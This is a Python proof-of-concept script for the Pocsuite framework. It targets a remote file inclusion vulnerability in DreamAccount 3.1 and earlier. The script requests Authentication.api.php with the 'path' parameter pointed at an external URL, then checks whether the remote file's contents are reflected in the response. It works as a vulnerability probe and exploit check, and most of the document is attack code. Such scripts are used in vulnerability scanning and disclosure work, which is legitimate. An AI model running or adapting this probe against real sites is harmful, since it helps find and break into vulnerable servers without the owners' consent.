#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = '63672'  # ssvid
    version = '1.0'
    author = ['皮皮']
    vulDate = '2006-12-01'
    createDate = '2015-12-24'
    updateDate = '2015-12-24'
    references = ['http://www.sebug.net/vuldb/ssvid-63672']
    name = 'DreamAccount &lt;= 3.1 (Authentication.api.php) Remote File Include Exploit'
    appPowerLink = ''
    appName = 'DreamAccount'
    appVersion = '<= 3.1'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/Authentication.api.php?path=http://baidu.com/robots.txt?' % self.url
        response = req.get(vul_url).content

        if 'Baiduspider' in response or 'Googlebot' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(TestPOC)
